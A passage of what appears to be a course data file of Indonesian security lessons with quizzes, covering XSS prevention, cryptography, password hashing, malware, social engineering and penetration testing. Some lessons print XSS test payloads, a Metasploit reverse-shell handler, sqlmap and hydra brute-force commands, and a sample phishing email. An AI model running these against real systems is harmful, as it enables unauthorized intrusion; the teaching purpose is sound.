- **Worm propagation** — XSS yang mereplikasi diri (contoh: Samy Worm di MySpace 2005).

## Cara Mencegah XSS

### 1. Output Encoding

Encode karakter khusus sesuai konteks output (HTML, attribute, JavaScript, URL).

\`\`\`javascript
// Node.js dengan escape-html
const escape = require('escape-html');
res.send(\`<div>\${escape(userInput)}</div>\`);

// React otomatis escape
return <div>{userInput}</div>;
\`\`\`

### 2. Content Security Policy (CSP)

Header CSP membatasi sumber script yang boleh dieksekusi browser.

\`\`\`nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self' https://cdn.example.com; object-src 'none'; base-uri 'self'";
\`\`\`

### 3. HttpOnly Cookie

Mencegah JavaScript membaca cookie sesi.

\`\`\`text
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
\`\`\`

### 4. Hindari innerHTML, gunakan textContent

\`\`\`javascript
// Buruk
element.innerHTML = userInput;

// Baik
element.textContent = userInput;
\`\`\`

### 5. Sanitasi Input untuk Rich Text

Jika menerima HTML (misalnya komentar dengan format), gunakan library sanitasi seperti DOMPurify.

\`\`\`javascript
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(dirtyHtml);
\`\`\`

## Mendeteksi XSS

\`\`\`bash
# Scanner otomatis
docker run --rm -t owasp/zap2docker-stable zap-baseline.py -t https://target.com

# Payload test manual
# <script>alert(1)</script>
# <img src=x onerror=alert(1)>
# "><script>alert(1)</script>
# javascript:alert(document.cookie)
\`\`\`

## Tips & Best Practices

- Jangan pernah memasukkan data tidak tepercaya langsung ke \`innerHTML\`, \`document.write\`, \`eval\`, atau atribut \`href="javascript:"\`.
- Gunakan framework modern (React, Vue, Angular) yang otomatis escape.
- Audit dependency pihak ketiga yang memanipulasi DOM.
- Aktifkan Trusted Types di browser yang mendukung.
- Lakukan pentest aplikasi minimal tahunan.

## Kesimpulan

XSS tetap menjadi risiko web paling sering muncul meskipun solusinya sudah jelas. Dengan disiplin output encoding, CSP, dan cookie HttpOnly, mayoritas vektor XSS dapat dimitigasi. Kuncinya: **jangan pernah mempercayai data yang dirender ke browser**. Keamanan adalah komitmen setiap commit.`,
    quiz: [
      {
        question: "Jenis XSS yang disimpan permanen di server?",
        options: ["Reflected", "Stored", "DOM-based", "Mutation"],
        answer: 1,
        explanation: "Stored XSS disimpan di server (mis. komentar) dan menyebar ke banyak korban."
      },
      {
        question: "Header yang membatasi sumber script di browser?",
        options: ["X-Frame-Options", "Content-Security-Policy", "Strict-Transport-Security", "X-XSS-Protection"],
        answer: 1,
        explanation: "Content-Security-Policy membatasi sumber daya yang boleh dimuat browser."
      },
      {
        question: "Atribut cookie yang mencegah akses via JavaScript?",
        options: ["Secure", "SameSite", "HttpOnly", "Domain"],
        answer: 2,
        explanation: "HttpOnly membuat cookie tidak bisa dibaca oleh document.cookie."
      }
    ]
  },
  {
    level: 6,
    order: 8,
    title: "Kriptografi Dasar",
    slug: "kriptografi-dasar",
    description: "Simetri, asimetri, hash, dan protokol kriptografi modern.",
    icon: "🔐",
    isProject: false,
    content: `# Kriptografi Dasar

**Kriptografi** adalah ilmu mengamankan informasi melalui transformasi data menjadi bentuk yang tidak dapat dibaca tanpa kunci. Kriptografi bukan sekadar enkripsi—mencakup autentikasi, integritas, non-repudiation, dan pertukaran kunci. Memahami dasar-dasar kriptografi adalah kunci untuk merancang sistem yang aman dan menghindari kesalahan klasik seperti menggunakan MD5 untuk password.

![Kriptografi Dasar](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## Konsep Inti

1. **Plaintext** — pesan asli yang dapat dibaca.
2. **Ciphertext** — pesan terenkripsi yang tidak dapat dibaca.
3. **Key (Kunci)** — rahasia yang mengontrol proses enkripsi/dekripsi.
4. **Algoritma** — fungsi matematika untuk transformasi.
5. **Kerckhoffs's Principle** — keamanan harus bergantung pada kerahasiaan kunci, bukan algoritma.

## Enkripsi Simetris

Menggunakan **kunci yang sama** untuk enkripsi dan dekripsi. Cepat dan cocok untuk data besar.

- **Algoritma modern**: AES-256-GCM, ChaCha20-Poly1305.
- **Mode aman**: GCM, ChaCha20 (authenticated encryption).
- **Hindari**: ECB (tidak aman), DES, 3DES, Blowfish untuk data baru.

\`\`\`python
# Python: AES-GCM dengan cryptography
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

key = AESGCM.generate_key(bit_length=256)
nonce = os.urandom(12)
aesgcm = AESGCM(key)
ciphertext = aesgcm.encrypt(nonce, b"rahasia", None)
plaintext = aesgcm.decrypt(nonce, ciphertext, None)
\`\`\`

## Enkripsi Asimetris

Menggunakan **pasangan kunci** (public & private). Publik untuk mengenkripsi, privat untuk mendekripsi. Cocok untuk pertukaran kunci dan tanda tangan digital.

- **Algoritma**: RSA (2048+/4096 bit), ECC (Curve25519, P-256), Ed25519.
- **Penggunaan**: TLS/HTTPS, SSH, PGP, signal protocol.

\`\`\`bash
# Generate SSH keypair modern dengan Ed25519
ssh-keygen -t ed25519 -C "user@example.com" -f ~/.ssh/id_ed25519

# Generate RSA 4096 untuk kompatibilitas lama
ssh-keygen -t rsa -b 4096 -C "user@example.com"
\`\`\`

## Fungsi Hash

Hash satu arah menghasilkan **digest** tetap dari input berapa pun. Properti: preimage-resistant, second preimage-resistant, collision-resistant.

- **Untuk integritas**: SHA-256, SHA-3, BLAKE3.
- **Untuk password**: bcrypt, scrypt, argon2id (dengan salt + work factor).
- **Hindari**: MD5, SHA-1 (collision ditemukan).

\`\`\`bash
# Hash file dengan SHA-256
sha256sum disk.iso

# Hash password dengan argon2 (via argon2-cli)
echo -n "mypassword" | argon2 somesalt -id -t 3 -m 16 -p 1 -l 32
\`\`\`

## MAC & Tanda Tangan Digital

- **MAC (Message Authentication Code)** — simetris, contoh HMAC-SHA256. Memverifikasi integritas dan autentikasi, tetapi penerima bisa memalsukan.
- **Digital Signature** — asimetris (Ed25519, ECDSA, RSA-PSS). Hanya pemilik private key yang bisa menandatangani, memberi non-repudiation.

\`\`\`python
# Tanda tangan Ed25519
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
priv = Ed25519PrivateKey.generate()
pub  = priv.public_key()
sig  = priv.sign(b"dokumen penting")
pub.verify(sig, b"dokumen penting")  # raises on invalid
\`\`\`

## Pertukaran Kunci & TLS

**Diffie-Hellman** memungkinkan dua pihak menyepakati kunci bersama tanpa pernah mengirimkannya. **TLS 1.3** menggabungkan ECDHE (ephemeral DH kurva eliptis) untuk perfect forward secrecy, dengan sertifikat X.509 untuk autentikasi server. TLS 1.3 juga menghapus cipher lemah dan RTT berlebih.

## PKI & Sertifikat

Public Key Infrastructure mengatur penerbitan sertifikat oleh Certificate Authority (CA). Sertifikat berisi public key, identitas, dan tanda tangan CA. Browser mempercayai CA yang ada di root store. **Let's Encrypt** menyediakan sertifikat gratis via ACME protocol.

\`\`\`bash
# Dapatkan sertifikat gratis Let's Encrypt
sudo certbot --nginx -d example.com -d www.example.com

# Cek rantai sertifikat
openssl s_client -connect example.com:443 -showcerts
\`\`\`

## Tips & Best Practices

- Jangan pernah membuat algoritma kriptografi sendiri—gunakan library standar.
- Gunakan HTTPS everywhere, redirect HTTP ke HTTPS.
- Rotasi kunci dan kelola dengan KMS/Vault.
- Aktifkan HSTS untuk mencegah downgrade attack.
- Verifikasi rantai sertifikat dan pinning bila perlu (mobile apps).

## Kesimpulan

Kriptografi adalah fondasi kepercayaan digital. Memahami perbedaan simetri/asimetri, hash vs password hashing, serta tanda tangan digital membuat Anda mampu memilih algoritma yang tepat untuk setiap kasus. Selalu ikuti rekomendasi terkini dari NIST dan IETF— kriptografi adalah ilmu yang terus berkembang.`,
    quiz: [
      {
        question: "Algoritma enkripsi simetris yang direkomendasikan saat ini?",
        options: ["MD5", "AES-256-GCM", "RSA-1024", "SHA-1"],
        answer: 1,
        explanation: "AES-256-GCM adalah simetris modern dengan authenticated encryption."
      },
      {
        question: "Algoritma hash yang TIDAK boleh digunakan untuk password?",
        options: ["Argon2id", "bcrypt", "scrypt", "MD5"],
        answer: 3,
        explanation: "MD5 terlalu cepat dan rawan collision, tidak aman untuk password."
      },
      {
        question: "Pasangan kunci yang digunakan dalam kriptografi asimetris?",
        options: ["Salt & pepper", "Public & private key", "IV & nonce", "Token & session"],
        answer: 1,
        explanation: "Asimetris menggunakan public key (enkripsi) dan private key (dekripsi)."
      }
    ]
  },
  {
    level: 6,
    order: 9,
    title: "Password Security & Hashing",
    slug: "password-security-hashing",
    description: "Hashing password, salt, brute force, dan password manager.",
    icon: "🔑",
    isProject: false,
    content: `# Password Security & Hashing

Password adalah bentuk autentikasi paling umum—dan paling sering disalahkan dalam insiden keamanan. Penyimpanan password yang salah dapat menyebabkan kebocoran massal saat database dicuri. Materi ini menjelaskan cara menghash password dengan benar, melindungi dari serangan brute force, dan mendorong praktik password yang sehat bagi pengguna akhir.

![Password Security & Hashing](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## Mengapa Password Harus Dihash

Menyimpan password plaintext adalah bencana: satu insiden SQL Injection dan seluruh akun pengguna terbongkar. Hashing satu arah memastikan bahkan admin database pun tidak bisa tahu password asli. Saat pengguna login, hash dari input dibandingkan dengan hash yang tersimpan—tidak pernah ada "dekripsi" password.

## Algoritma Hash yang Aman untuk Password

Hashing password membutuhkan algoritma **lambat dan mahal komputasi**, bukan hash cepat seperti SHA-256. Tujuannya agar brute force tidak ekonomis.

| Algoritma | Karakteristik | Rekomendasi |
|-----------|--------------|-------------|
| **Argon2id** | Memory-hard, winner PHC 2015 | ✅ Default modern |
| **bcrypt** | Battle-tested, work factor | ✅ Stabil & luas |
| **scrypt** | Memory-hard | ✅ Alternatif |
| **PBKDF2** | Iterasi tinggi | ⚠️ Lebih lemah dari argon2 |
| MD5/SHA-1/SHA-256 | Cepat, rawan GPU/ASIC | ❌ Jangan dipakai |

\`\`\`python
# Python: hashing password dengan argon2
from argon2 import PasswordHasher, exceptions

ph = PasswordHasher(
    time_cost=3,        # iterasi
    memory_cost=65536,  # 64 MB
    parallelism=4,
    hash_len=32,
    salt_len=16
)

hash_str = ph.hash("mySecretPassword")
# Verifikasi
try:
    ph.verify(hash_str, "mySecretPassword")  # True
except exceptions.VerifyMismatchError:
    print("Password salah")
\`\`\`

## Salt & Pepper

- **Salt** — nilai acak unik per password, disimpan bersama hash. Mencegah rainbow table attack.
- **Pepper** — secret server-side yang ditambahkan sebelum hash, TIDAK disimpan di DB. Memerlukan kompromi server dan DB untuk retas.

Library seperti bcrypt/argon2 otomatis mengelola salt—Anda tidak perlu mengelola manual.

## Serangan terhadap Password

1. **Brute force** — mencoba semua kombinasi.
2. **Dictionary attack** — daftar kata umum + variasi.
3. **Credential stuffing** — menggunakan pasangan email:password dari leak lain.
4. **Rainbow table** — precomputed hash (dimitigasi oleh salt).
5. **GPU/ASIC attack** — memanfaatkan paralelisme (dimitigasi oleh memory-hard).

## Kebijakan Password Modern

NIST SP 800-63B (revisi 2017) mengubah pandangan lama:

- ✅ Minimal 8 karakter (atau 6 untuk user-chosen dengan kompromi).
- ✅ Izinkan panjang hingga 64 karakter dan semua karakter ASCII/Unicode.
- ✅ Bandingkan dengan daftar password bocor (HaveIBeenPwned API).
- ❌ JANGAN wajibkan kompleksitas (huruf besar/kecil/angka/simbol) yang memicu pola "Password1!".
- ❌ JANGAN wajibkan rotasi periodik tanpa alasan.
- ✅ Blokir password yang umum ("password", "123456", nama aplikasi).

## MFA dan Passwordless

Multi-Factor Authentication menambah lapisan: **something you know** (password), **something you have** (token/hp), **something you are** (biometrik). Standar modern:

- **TOTP** — Google Authenticator, Authy (RFC 6238).
- **WebAuthn / FIDO2** — kunci hardware (YubiKey) atau platform authenticator.
- **Push notification** — Duo, Microsoft Authenticator.
- **SMS OTP** — kurang aman (SIM swap), hindari untuk akun sensitif.

\`\`\`python
# Implementasi TOTP sederhana
import pyotp, time

secret = pyotp.random_base32()
totp = pyotp.TOTP(secret, interval=30, digits=6)
print("QR untuk pengguna:", pyotp.totp.TOTP(secret).provisioning_uri(
    name="user@example.com", issuer_name="MyApp"))
print("Kode saat ini:", totp.now())
\`\`\`

## Password Manager

Dorong pengguna memakai password manager (Bitwarden, 1Password, KeePass) untuk:

- Generate password acak panjang (16+ karakter) unik per layanan.
- Simpan dengan enkripsi AES-256 + zero-knowledge.
- Auto-fill untuk mencegah phishing (hanya domain yang cocok).

## Tips & Best Practices

- Selalu rehash saat parameter work factor naik (transparent upgrade).
- Implementasikan rate limiting dan CAPTCHA di endpoint login.
- Log kegagalan login dan kirim notifikasi email "new login from device".
- Sediakan flow recovery yang aman (reset token short-lived, single-use).
- Lakukan breach monitoring untuk akun pengguna.

## Kesimpulan

Password security adalah kombinasi algoritma yang tepat (argon2id/bcrypt), kebijakan yang berbasis risiko (bukan kompleksitas kaku), dan MFA. Dengan menerapkan standar NIST modern dan passwordless, Anda melindungi pengguna bahkan ketika database bocor. Keamanan password bukan tentang kompleksitas, tetapi tentang keunikan dan hashing yang benar.`,
    quiz: [
      {
        question: "Algoritma hash password yang paling direkomendasikan saat ini?",
        options: ["MD5", "SHA-256", "Argon2id", "Base64"],
        answer: 2,
        explanation: "Argon2id adalah pemenang Password Hashing Competition, memory-hard dan tahan GPU."
      },
      {
        question: "Nilai acak unik per password untuk mencegah rainbow table?",
        options: ["Pepper", "Salt", "IV", "Nonce"],
        answer: 1,
        explanation: "Salt unik per password membuat precomputed table tidak efektif."
      },
        {
        question: "Standar MFA berbasis kunci hardware yang modern?",
        options: ["SMS OTP", "WebAuthn/FIDO2", "Email link", "Security question"],
        answer: 1,
        explanation: "WebAuthn/FIDO2 menggunakan public key cryptography dan tahan phishing."
      }
    ]
  },
  {
    level: 6,
    order: 10,
    title: "Malware & Virus",
    slug: "malware-virus",
    description: "Jenis malware, cara kerja, dan strategi pertahanan endpoint.",
    icon: "🦠",
    isProject: false,
    content: `# Malware & Virus

**Malware** (malicious software) adalah perangkat lunak yang dirancang untuk merusak, mencuri, atau mengontrol sistem tanpa persetujuan pengguna. Bentuknya beragam—virus, worm, trojan, ransomware, spyware, rootkit—dan terus berevolusi mengikuti pertahanan. Memahami cara kerja malware membantu Anda membangun pertahanan endpoint dan respons insiden yang efektif.

![Malware & Virus](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## Klasifikasi Malware

### Virus
Menginfeksi file host dan menyebar saat file dijalankan. Tidak bisa berjalan sendiri—membutuhkan host.

### Worm
Menyebar otomatis melalui jaringan tanpa intervensi pengguna. Contoh: Conficker, Stuxnet, WannaCry (yang menggunakan exploit EternalBlue SMB).

### Trojan
Menyamar sebagai aplikasi sah, membuka backdoor. Contoh: Emotet, TrickBot.

### Ransomware
Mengenkripsi file korban dan meminta tebusan. Variants terkenal: CryptoLocker, LockBit, Conti, BlackCat/ALPHV. Sering disebarkan via RDP brute force, phishing, atau exploit.

### Spyware & Adware
Memata-matai aktivitas pengguna atau menampilkan iklan paksa. Contoh: Pegasus (spyware mobile), keylogger.

### Rootkit
Bersembunyi di level kernel (mode driver) atau bootloader untuk menghindari deteksi. Contoh: NTRootkit, LoJack BIOS rootkit.

### Fileless Malware
Bermukim di memori, PowerShell, WMI, atau registry—tidak meninggalkan file di disk. Sulit dideteksi signature-based.

## Siklus Hidup Serangan

1. **Initial Access** — phishing, exploit, brute force RDP, supply chain.
2. **Execution** — payload (PowerShell, macro, executable).
3. **Persistence** — scheduled task, registry Run key, service.
4. **Privilege Escalation** — exploit local, token impersonation.
5. **Defense Evasion** — disable AV, clear log, obfuscation.
6. **Credential Access** — Mimikatz, LSASS dump.
7. **Discovery & Lateral Movement** — port scan, pass-the-hash, SMB/WMI.
8. **Collection & Exfiltration** — archive data, exfil via HTTPS/DNS.
9. **Impact** — ransomware encryption, data destruction.

MITRE ATT&CK mengkodifikasi taktik dan teknik ini sebagai referensi standar.

## Cara Mendeteksi Malware

### Signature-based
Cocokkan hash, string, atau pola file dengan database threat. Cepat tetapi lemah terhadap varian baru.

### Heuristic & Behavior-based
Menganalisis perilaku (API calls, network connections, registry changes). Mendeteksi varian baru. Basis dari EDR modern.

### Machine Learning
Model ML menilai file berdasarkan ribuan fitur. Digunakan oleh Windows Defender, CrowdStrike, SentinelOne.

\`\`\`bash
# Scan dengan ClamAV
sudo clamscan -r --bell -i /home/

# Analisis file mencurigakan di VirusTotal
curl -s --request POST --url https://www.virustotal.com/api/v3/files \\
  --header "x-apikey: $VT_API_KEY" --form file=@./sample.exe

# Cek persistence umum di Windows (PowerShell as admin)
Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'}
Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location
\`\`\`

## Strategi Pertahanan Endpoint

1. **EDR (Endpoint Detection & Response)** — CrowdStrike, SentinelOne, Defender for Endpoint. Bukan hanya antivirus—mendeteksi, menginvestigasi, dan merespons.
2. **Application Whitelisting** — AppLocker, WDAC. Hanya biner yang ditandatangani yang boleh jalan.
3. **Patch Management** — tutup CVE sebelum eksploitasi. WannaCry menyebar karena SMBv1 tidak di-patch.
4. **Email Security** — gateways dengan sandbox detonasi attachment.
5. **Macro Control** — disable Office macro by default.
6. **Privilege Separation** — user biasa tidak punya admin lokal.
7. **Network Segmentation** — batasi lateral movement.

## Analisis Malware (Pendahuluan)

Saat menemukan sampel malware, **jangan menjalankannya di mesin kerja**. Gunakan lab terisolasi:

\`\`\`text
Lab analisis malware:
- VM terisolasi (VirtualBox/VMware, no shared folder, host-only network)
- REMnux / FlareVM sebagai OS analisis
- Tools: PEStudio, Detect It Easy, Wireshark, Procmon, x64dbg, Ghidra
- Sandbox otomatis: Cuckoo, Any.run, Joe Sandbox
\`\`\`

Analisis statis (mengubah file tanpa menjalankan) meliputi strings, import table, entropy, dan disassembling. Analisis dinamis menjalankan sampel di sandbox dan mengamati perilaku.

## Ransomware: Mitigasi Khusus

- Backup offline/immutable yang tidak bisa dihapus oleh akun terinfeksi.
- Segmentasi jaringan, batasi RDP exposure (atau nonaktifkan).
- Aktifkan tamper protection di AV.
- Punya playbook incident response khusus ransomware.
- Jangan membayar tebusan—mendorong bisnis kriminal dan tidak menjamin recovery.

## Tips & Best Practices

- Aktifkan logging Sysmon di Windows untuk threat hunting.
- Deploy MFA di semua akses remote (VPN, RDP).
- Latih pengguna waspada terhadap email attachment dan macro.
- Lakukan threat hunting berkala menggunakan MITRE ATT&CK.
- Siapkan offline backup yang teruji restore.

## Kesimpulan

Malware terus berevolusi, tetapi praktik dasar pertahanan tetap sama: patch tepat waktu, EDR modern, segmentasi, backup, dan edukasi pengguna. Pendekatan defense in depth yang menggabungkan teknologi, proses, dan manusia tetap merupakan strategi paling efektif melindungi organisasi dari ancaman malware modern.`,
    quiz: [
      {
        question: "Malware yang mengenkripsi file korban dan meminta tebusan?",
        options: ["Trojan", "Ransomware", "Spyware", "Rootkit"],
        answer: 1,
        explanation: "Ransomware mengenkripsi data dan menuntut tebusan untuk kunci dekripsi."
      },
      {
        question: "Malware yang menyebar otomatis tanpa intervensi pengguna?",
        options: ["Virus", "Worm", "Trojan", "Adware"],
        answer: 1,
        explanation: "Worm mereplikasi diri via jaringan tanpa host file."
      },
      {
        question: "Tools standar untuk analisis malware terisolasi?",
        options: ["Wireshark di mesin kerja", "Sandbox REMnux/FlareVM", "Excel pivot", "Browser devtools"],
        answer: 1,
        explanation: "Lab REMnux/FlareVM terisolasi aman untuk detonasi sampel malware."
      }
    ]
  },
  {
    level: 6,
    order: 11,
    title: "Social Engineering",
    slug: "social-engineering",
    description: "Phishing, pretexting, baiting, dan cara membangun budaya keamanan.",
    icon: "🎭",
    isProject: false,
    content: `# Social Engineering

**Social engineering** adalah manipulasi faktor manusia untuk membocorkan informasi atau melakukan aksi yang merugikan. Tidak peduli seberapa canggih teknologi pertahanan, satu karyawan yang tertipu bisa membuka pintu bagi penyerang. Studi menunjukkan bahwa mayoritas insiden dimulai dengan vektor sosial—manusia adalah mata rantai terlemah sekaligus pertahanan terkuat jika dilatih.

![Social Engineering](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## Mengapa Social Engineering Efektif

Manusia memiliki bias psikologis yang dieksploitasi penyerang:

- **Authority** — kepatuhan pada figur otoritas ("ini dari CEO/CFO").
- **Urgency** — tekanan waktu ("akun diblokir dalam 1 jam").
- **Social proof** — "semua orang sudah update".
- **Reciprocity** — "saya sudah bantu, sekarang giliran Anda".
- **Curiosity** — "lihat dokumen rahasia ini".
- **Greed/Fear** — bonus fiktif atau ancaman hukum.

## Jenis Social Engineering

### Phishing
Email palsu menyamar sebagai entitas terpercaya. Variannya:
- **Spear phishing** — tertarget, hasil riset LinkedIn dst.
- **Whaling** — menargetkan eksekutif (C-level).
- **Clone phishing** — duplikat email sah sebelumnya dengan link berubah.
- **Business Email Compromise (BEC)** — penyamaran eksekutif untuk transfer dana.

### Vishing & Smishing
- **Vishing (voice phishing)** — telepon mengaku dari bank, IT support, atau pemerintah.
- **Smishing (SMS phishing)** — paket jne palsu, hadiah, OTP social engineering.

### Pretexting
Penyerang menciptakan skenario/skenario (pretext) untuk mendapatkan informasi: "saya dari vendor audit, butuh konfirmasi data".

### Baiting & Quid Pro Quo
- **Baiting** — flash disk tertinggal di parkiran berlabel "Gaji 2024", korban mencolokkan.
- **Quid pro quo** — "saya dari support, akan percepat komputer Anda, install teamviewer".

### Tailgating & Physical
- **Tailgating** — masuk pintu dengan mengikuti karyawan yang berbadged.
- **Shoulder surfing** — mengintip password dari belakang.
- **Dumpster diving** — mengais sampah dokumen.

## Contoh Email Phishing Klasik

\`\`\`text
Subject: [URGENT] Akun Anda Akan Diblokir dalam 24 Jam

Pelanggan Yth,

Kami mendeteksi aktivitas tidak biasa pada akun Anda. Untuk menghindari
pemblokiran permanen, harap verifikasi identitas Anda dalam 24 jam:

  👉 https://secure-bank-verify.com/login

Hormat kami,
Tim Keamanan Bank ABC

Tanda: email dari bank-secure@mail.ru, link ke domain yang bukan bank,
gaya bahasa mendesak, logo buram.
\`\`\`

## Tanda-tanda Phishing

1. Domain/email pengirim tidak cocok (gmail/yahoo untuk "bank").
2. Salam umum ("Pelanggan Yth") bukan nama.
3. Tautan hover menunjukkan domain berbeda.
4. Permintaan data sensitif via email (bank asli tidak pernah minta PIN/password).
5. Attachment tak diharapkan (.zip, .html, macro Office).
6. Kesalahan tata bahasa, desain logo buram.
7. Tekanan emosional (urgency, fear, hadiah).

## Membangun Budaya Keamanan

### 1. Simulasi Phishing Berkala
Kirim phishing palsu internal, ukur klik rate, dan latih yang gagal. Platform: KnowBe4, Proofpoint Security Awareness, GoPhish (open source).

### 2. Pelatihan Singkat & Relevan
Modul mikro 5-10 menit lebih efektif daripada training tahunan membosankan. Topik: password, MFA, phishing, BYOD, public WiFi.

### 3. Proses Verifikasi
- Minta pegawai selalu verifikasi via channel lain (telepon langsung ke nomor resmi) untuk permintaan finansial.
- Implementasikan "out-of-band verification" untuk transaksi besar.

### 4. Laporan Mudah
Tombol "Report Phishing" di email client. Beri apresiasi/leaderboard untuk laporan yang akurat.

\`\`\`bash
# Analisis header email phishing
# Ekstrak Received, SPF, DKIM, DMARC
cat email.eml | grep -iE "^(Received|Authentication-Results|From|Reply-To):"

# Cek reputasi domain/url
curl -s "https://urlhaus-api.abuse.ch/v1/url/" -d "url=https://suspicious.example"
\`\`\`

## Defense Teknis Pendukung

- **DMARC (p=reject)** + SPF + DKIM — mencegah spoofing domain.
- **Email gateway** dengan sandbox attachment & link rewrite.
- **MFA** yang tahan phishing (WebAuthn/FIDO2).
- **DNS filtering** (Cisco Umbrella, Quad9).
- **Browser isolation** untuk klik link mencurigakan.

## Tips & Best Practices

- Budaya "no-blame" untuk pelaporan—jangan hukum yang tertipu, beri apresiasi.
- Verifikasi semua permintaan finansial via minimal 2 channel.
- Review social media exposure (LinkedIn info jabatan → target spear phishing).
- Latih staf front desk & helpdesk sebagai garis pertahanan.
- Lakukan exercise physical social engineering tahunan.

## Kesimpulan

Social engineering mengeksploitasi manusia, bukan teknologi. Pertahanan terbaik adalah kombinasi edukasi berkelanjutan, proses verifikasi, dan kontrol teknis seperti DMARC + FIDO2. Manusia yang terlatih dan diberdayakan adalah sensor keamanan paling efektif—jauh melampaui alat otomatis manapun.`,
    quiz: [
      {
        question: "Phishing tertarget yang menargetkan eksekutif C-level?",
        options: ["Smishing", "Whaling", "Vishing", "Pharming"],
        answer: 1,
        explanation: "Whaling adalah spear phishing yang menargetkan pejabat tinggi (whale)."
      },
      {
        question: "Teknik social engineering dengan menaruh flash disk berbahaya?",
        options: ["Pretexting", "Baiting", "Tailgating", "Vishing"],
        answer: 1,
        explanation: "Baiting memancing korban mengambil objek (USB) yang sebenarnya berbahaya."
      },
      {
        question: "Mekanisme email yang mencegah spoofing domain pengirim?",
        options: ["DMARC + SPF + DKIM", "TLS 1.3", "PGP signing", "S/MIME"],
        answer: 0,
        explanation: "Kombinasi SPF, DKIM, dan DMARC memvalidasi pengirim email."
      }
    ]
  },
  {
    level: 6,
    order: 12,
    title: "Penetration Testing Basics",
    slug: "penetration-testing-basics",
    description: "Metodologi pentest, tools, dan pelaporan kerentanan.",
    icon: "⚔️",
    isProject: false,
    content: `# Penetration Testing Basics

**Penetration Testing (pentest)** adalah simulasi serangan terhadap sistem dengan izin tertulis untuk menemukan kerentanan sebelum penyerang nyata melakukannya. Pentest berbeda dari vulnerability scan—scan otomatis menemukan, pentest mengonfirmasi dan mengeksploitasi. Tujuannya memberi gambaran realistis tentang risiko dan efektivitas pertahanan.

![Penetration Testing Basics](https://sfile.chatglm.cn/images-ppt/cdb300ed8989.jpg)

## Jenis Pentest Berdasarkan Informasi

1. **Black Box** — tester tidak tahu apa-apa tentang target (menyerupai penyerang eksternal).
2. **White Box** — tester diberi akses source code, arsitektur, kredensial (audit komprehensif).
3. **Gray Box** — kombinasi (mis. punya akun user biasa untuk menguji privilege escalation).

## Jenis Pentest Berdasarkan Cakupan

- **Network pentest** — eksternal (public IP) dan internal (LAN).
- **Web application pentest** — OWASP-based, frontend+API.
- **Mobile app pentest** — Android/iOS, server API, cert pinning.
- **Wireless pentest** — WiFi (WPA2/3, evil twin), Bluetooth.
- **Social engineering pentest** — phishing, physical.
- **Red team exercise** — simulasi APT multi-vektor dengan tujuan spesifik.

## Fase Pentest (PTES)

### 1. Pre-engagement Interactions
- Scope, RoE (Rules of Engagement), timeline, batasan.
- Kontrak, NDA, authorization letter (surat izin tertulis).
- Komunikasi escalation & emergency contacts.

### 2. Intelligence Gathering (Recon)
\`\`\`bash
# OSINT domain/subdomain
amass enum -d example.com
subfinder -d example.com -silent

# DNS profiling
dig any example.com
dnsenum example.com

# Web recon
whatweb https://example.com
nmap -sV -p- example.com
\`\`\`

### 3. Threat Modeling
Identifikasi aset, ancaman, dan vektor. Mengacu MITRE ATT&CK atau OWASP.

### 4. Vulnerability Analysis
\`\`\`bash
# Network vulnerability scanner
nmap --script vuln example.com
nessus -i target.list

# Web app scanner
nuclei -u https://example.com -t cves/
docker run --rm -t owasp/zap2docker-stable zap-baseline.py -t https://example.com
\`\`\`

### 5. Exploitation
Mengonfirmasi kerentanan benar-benar dapat dieksploitasi.

\`\`\`bash
# Metasploit framework
msfconsole
msf> use exploit/multi/handler
msf> set PAYLOAD windows/meterpreter/reverse_tcp
msf> set LHOST 10.0.0.5
msf> exploit

# SQLi otomatis
sqlmap -u "https://example.com/item?id=1" --batch --dbs --threads=4

# Brute force login
hydra -L users.txt -P pass.txt ssh://10.0.0.10
\`\`\`

### 6. Post-Exploitation
- Privilege escalation (LinPEAS, WinPEAS).
- Lateral movement (pass-the-hash, kerberoasting).
- Persistence (backdoor, scheduled task).
- Data exfiltration simulasi.

### 7. Reporting
Output utama pentest adalah laporan—bukan exploit itu sendiri.

## Standar & Framework

- **PTES** (Penetration Testing Execution Standard).
- **OWASP Testing Guide** untuk aplikasi web.
- **MITRE ATT&CK** untuk klasifikasi taktik/teknik.
- **NIST SP 800-115** technical guide to testing.
- **CVSS** v3.1 untuk skoring severity.

## Format Laporan Pentest

\`\`\`text
1. Executive Summary  — risiko bisnis, ringkasan temuan kritikal
2. Methodology        — jenis test, scope, batasan
3. Findings           — per temuan:
   - Title & CVSS score
   - Deskripsi & affected asset
   - Reproduction steps (PoC)
   - Impact
   - Remediation recommendation
4. Appendix           — raw output, tools, timeline
\`\`\`

## Tools Pentest Populer

| Kategori | Tools |
|----------|-------|
| Recon/OSINT | Amass, Subfinder, Maltego, theHarvester |
| Scanning | Nmap, Masscan, Nessus, OpenVAS |
| Web | Burp Suite, OWASP ZAP, nuclei, ffuf |
| Exploitation | Metasploit, SQLmap, BeEF |
| Password | Hashcat, John, Hydra, CrackMapExec |
| C2 | Cobalt Strike, Sliver, Mythic |
| Post-exp | LinPEAS, WinPEAS, Mimikatz, BloodHound |

## Tips & Best Practices

- Selalu dapat **izin tertulis** sebelum memulai—tanpa itu, ini kejahatan.
- Patuhi scope dan batasan waktu. Jangan sentuh sistem di luar cakupan.
- Catat log aktivitas untuk audit dan timeline.
- Hindari destruktif: jangan drop table, hapus file, atau DDoS production.
- Beri vendor waktu patch sebelum publikasi temuan (responsible disclosure).

## Kesimpulan

Pentest adalah investasi yang membuktikan postur keamanan secara empiris. Dengan metodologi yang jelas, tools yang tepat, dan laporan yang actionable, pentest membantu organisasi memprioritaskan perbaikan berdasarkan risiko nyata—bukan asumsi. Yang membedakan pentester profesional dari penyerang adalah **izin, etika, dan tanggung jawab**.`,
    quiz: [
      {
        question: "Jenis pentest di mana tester tidak tahu apa-apa tentang target?",
        options: ["White Box", "Black Box", "Gray Box", "Crystal Box"],
        answer: 1,
        explanation: "Black Box mensimulasikan penyerang eksternal tanpa informasi internal."
      },
      {
